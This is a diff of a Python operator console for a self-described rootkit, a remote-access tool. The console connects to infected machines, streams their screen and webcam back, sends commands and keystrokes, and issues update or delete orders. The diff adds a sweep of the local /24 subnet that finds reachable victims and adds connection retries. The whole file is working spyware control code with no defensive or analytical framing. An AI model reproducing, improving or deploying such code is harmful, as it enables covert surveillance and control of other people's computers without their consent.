@@ -4,11 +4,30 @@ from vidstream import StreamingServer
 from inputimeout import inputimeout, TimeoutOccurred
 import threading
 
+def testIfIpTrue(data, total=False):
+    if total == False:
+        datasplit = data.split('.')
+        for i in range(len(datasplit)):
+            if int(datasplit[i]) > 255:
+                return False
+        return True
+    if total != False:
+        datasplit = data.split('.')
+        return testIfIpTrue(data) == True and len(datasplit) == 4
+
 def Ip(data, ipmodify="0"):
+    global ipHost
     if data == "modify":
-        ipyou = open("ip.txt", "w")
-        ipyou.write(ipmodify)
-        ipyou.close()
+        if testIfIpTrue(ipmodify, True) == True:
+            ipyou = open("ip.txt", "w")
+            ipyou.write(ipmodify)
+            ipyou.close()
+            ipHost = Ip("return")
+            restart()
+            return True
+        else:
+            print("invalid ip")
+            return False
     if data == "return":
         try:
             ipyou = open("ip.txt", "r")
@@ -25,7 +44,7 @@ def stopSpaceError(data):
     data = " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
     return data
 
-def start():
+def restart():
     global ipToConnect, ipHost, port
     ipToConnect = str()
     ipHost = Ip("return")
@@ -34,12 +53,12 @@ def start():
     print("###################################"+"                                                          connect to "+ipHost)
     print("##### r007k17 by 7r1574n n13l #####")
     print("###################################"+"                                                          port "+str(port))
-
-start()
-if ipHost == "nothing":
-    Ip("modify", input("write your ip : "))
-    ipHost = Ip("return")
-    start()
+def starting():
+    restart()
+    ret = None
+    if ipHost == "nothing":
+        while ret != True:
+            ret = Ip("modify", input("write your ip : "))
 
 def help(data):
     if data == "command":
@@ -66,15 +85,41 @@ def help(data):
         while x < NumberOfLine:
             print((re.compile(r'[\n\r\t]')).sub(" ", f.readline()))
             x += 1
-        
+
+def testAll(speed=0.3):
+    if speed == True:
+        speed = 0.005
+    listIpAvailable, ipHostList = [], ipHost.split(".")
+    ipHostList.pop(len(ipHostList)-1)
+    ipHostList = ".".join(ipHostList)
+    for i in range(256):
+        command("co "+ipHostList+"."+str(i))
+        server = creatClient(ipHostList+"."+str(i), speed)
+        if server == True:
+            print("connect to "+ipHostList+"."+str(i))
+            time.sleep(4)
+            listIpAvailable.append(ipHostList+"."+str(i))
+            sendData("left")
+            try:
+                camera.stop_server()
+                screen.stop_server()
+                server = False
+            except:
+                pass
+    if len(listIpAvailable) > 0 :
+        print(listIpAvailable)
+    else:
+        print("il n'y a aucune ip disponible")
+    command(input(">"))
+            
 def command(commandToExecute):
     commandToExecute = stopSpaceError(commandToExecute)
     commandToExecuteList = commandToExecute.split()
-    global ipToConnect
+    global ipToConnect, ip
     try:
         if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
             if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
-                return commandToExecuteList[1]
+                ip = commandToExecuteList[1]
             else:
                 print("[ERROR]: no ip requested")
                 command(input(">"))
@@ -91,48 +136,75 @@ def command(commandToExecute):
             command(input(">"))
         elif commandToExecuteList[0] in ("modify", "modifyip"):
             if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
-                Ip("modify", commandToExecuteList[1])
-                start()
-                print("#                                 #")
-                print("##########  ip modified  ##########")
+                ret = Ip("modify", commandToExecuteList[1])
+                if ret == True:
+                    print("#                                 #")
+                    print("##########  ip modified  ##########")
                 command(input(">"))
             else:
                 print("no ip write")
                 command(input(">"))
-        elif commandToExecute in ("clear", "cleared", "cls"):
-            start()
+        elif commandToExecute in ("clear", "cleared", "cls", "restart"):
+            restart()
             command(input(">"))
+        elif commandToExecuteList[0] in ("testAll", "testall", "testallip", "testallIp", "testip", "testIp"):
+            if len(commandToExecuteList) > 1:
+                if commandToExecuteList[1] in ("speed", "spd"):
+                    testAll(speed=True)
+                else:
+                    testAll()
+            else:
+                testAll()
         else:
             print("Error")
             command(input(">"))
     except:
+        print("error")
         command(input(">"))
     
 def sendData(data):
     global run
     datalist = data.split()
-    if data in ("die", "kill"):
-        client.send("die".encode())
-        run = False
-    elif data in ("help", "aide"):
+    try:
+        if data in ("die", "kill"):
+            try:
+                client.send("die".encode())
+            except:
+                pass
+            run = False
+        elif data in ("help", "aide"):
             help("sending")
-    elif data in ("left", "quit", "restart"):
-        client.send("left".encode())
-        run = False
-    elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
-        client.send("screen".encode())
-    elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
-        screenStop()
-    elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
-        client.send("camera".encode())
-    elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
-        cameraStop()
-    elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
-        datalist.pop(0)
-        data = "fast "+" ".join(datalist)
-        client.send(data.encode())
-    else:
-        client.send(data.encode())
+        elif data in ("left", "quit", "restart"):
+            try:
+                client.send("left".encode())
+            except:
+                pass
+            run = False
+        elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
+            client.send("screen".encode())
+        elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
+            screenStop()
+        elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
+            client.send("camera".encode())
+        elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
+            cameraStop()
+        elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
+            datalist.pop(0)
+            data = "fast "+" ".join(datalist)
+            client.send(data.encode())
+        elif data in ("update"):
+            run = False
+            client.send("update".encode())
+        elif datalist[0] in ("update"):
+            run = False
+            if datalist[1] in ("delete", "del", "sup", "clear", "cls", "cleared"):
+                client.send("updelte".encode())
+            else:
+                client.send("update".encode())
+        else:
+            client.send(data.encode())
+    except:
+        pass
 
 def getIp():
     serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -174,42 +246,53 @@ def cameraStop():
     t = threading.Thread(target=camera.start_server)
     t.start()
 
-def creatClient():
+def creatClient(ip, timeout):
     global screen, camera, client, run
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.settimeout(5)
-    try:
-        client.connect((ip, port))
-        screen = StreamingServer(ipHost, 22224)
-        t = threading.Thread(target=screen.start_server)
-        t.start()
-        camera = StreamingServer(ipHost, 22225)
-        t = threading.Thread(target=camera.start_server)
-        t.start()
-    except:
-        run = False
+    client, tryit = socket.socket(socket.AF_INET, socket.SOCK_STREAM), 0
+    client.settimeout(timeout)
+    while tryit <= 2:
         try:
-            print("can't connect to "+ip)
+            client.connect((ip, port))
+            screen = StreamingServer(ipHost, 22224)
+            t = threading.Thread(target=screen.start_server)
+            t.start()
+            camera = StreamingServer(ipHost, 22225)
+            t = threading.Thread(target=camera.start_server)
+            t.start()
+            return True
         except:
-            print("ip isn't allowed")
+            tryit += 1
+            if tryit >= 2:
+                run = False
+                try:
+                    print("can't connect to "+ip)
+                except:
+                    print("ip isn't allowed")
+                return False
+
+starting()
 
 progrun = True
 
 while progrun == True:
-    ip = command(input(">"))
+    ip = ""
+    command(input(">"))
     run = True
     if progrun == True:
-        creatClient()
+        server = creatClient(ip, 3)
     while run == True and progrun == True:
         try:
             dataToSend = inputimeout(prompt="%s>" % (ip), timeout=120)
         except:
             dataToSend = "left"
         sendData(dataToSend)
-    try:
-        camera.stop_server()
-        screen.stop_server()
-    except:
-        pass
+    if server == True:
+        try:
+            camera.stop_server()
+            screen.stop_server()
+            server = False
+        except:
+            pass
 print("prog stop")
+time.sleep(0.5)
 exit()
